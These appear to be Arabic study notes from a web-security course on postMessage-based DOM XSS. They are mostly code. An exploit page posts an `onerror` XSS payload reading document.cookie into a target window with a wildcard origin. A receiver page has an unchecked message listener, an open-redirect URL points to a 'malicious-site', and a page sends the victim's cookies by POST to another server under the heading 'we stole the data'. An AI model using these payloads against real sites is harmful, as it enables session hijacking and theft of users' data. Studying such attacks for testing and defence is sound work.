## شرح الفديوهات من الكورس حسام شادي  ==> 
![006 PostMessage &Dom XSS 1.mp4](attachments/006 PostMessage &Dom XSS 1.mp4)


## اول سيناريوا انك تلاقي ال function  اسمها addEventListener عند التارجت :
#### الشرح :
![2025-05-15 20-56-35.mkv](attachments/2025-05-15 20-56-35.mkv)
![2025-05-15 21-30-10.mkv](attachments/2025-05-15 21-30-10.mkv)
#### ملف الصفحه بتاعي  اللي في الشرح :
```html
<!DOCTYPE html>
<html>
<head>
  <title>Payload</title>
</head>
<body onload="exploit()">

<script>
function exploit() {
    var win = window.open("رابط التارجت", "exploit");

    setTimeout(() => {
        const payload = `<img src="x" onerror="alert(document.cookie)">`;
        win.postMessage(payload, "*");
    }, 500); // زوّد التوقيت شوية علشان تضمن الصفحة حملت
}
</script>

<button onclick="exploit()">Exploit</button>
<iframe name="exploit" style="display:none;"></iframe>

</body>
</html>


```


##   ثاني  سيناريوا انك تلاقي ال function  اسمها postMessage عند التارجت :

#### الشرح :
![2025-05-15 22-28-08.mkv](attachments/2025-05-15 22-28-08.mkv)
#### ملف الصفحه بتاعي  اللي في الشرح :
```javascript
<!DOCTYPE html>
<html>
<head>
  <title>Index Page (Receiver)</title>
</head>
<body>
  <h2>أنا صفحة الإندكس اللي فيها iframe وبتستقبل الرسالة</h2>

  <iframe src="target.html" width="600" height="300"></iframe>

  <script>
    window.addEventListener("message", function(event) {
      // ممكن تضيف تحقق من origin لو حبيت
      alert("استلمت الرسالة: " + event.data);
    }, false);
  </script>
</body>
</html>

```



## استغلال الaddEventListener وال postMessage  بس بلغات تانيه زي ال nude js وال flask
![2025-05-16 00-49-25.mkv](attachments/2025-05-16 00-49-25.mkv)
#### ملف الصفحه بتاعي  اللي في الشرح    nude js :

```http
https://vulnerable-site.com/redirect?url=https://malicious-site.com
```

#### ملف الصفحه بتاعي  اللي في الشرح    flask :
```html
<!DOCTYPE html>

<html>

<head><title>هاكر</title></head>

<body>

<h1>سرقنا الداتا ✅</h1>

<script>

fetch("http://127.0.0.1:5000/send_message", {

  method: "POST",

  headers: { "Content-Type": "application/x-www-form-urlencoded" },

  body: "message=" + encodeURIComponent(document.cookie)

}).then(() => {

  document.body.innerHTML += "<p>✔️ تمت العملية بنجاح</p>";

});

</script>

</body>

</html>
```


خش لخص الكلام اللي في الموقع ده مهم  https://github.com/yavolo/eventlistener-xss-recon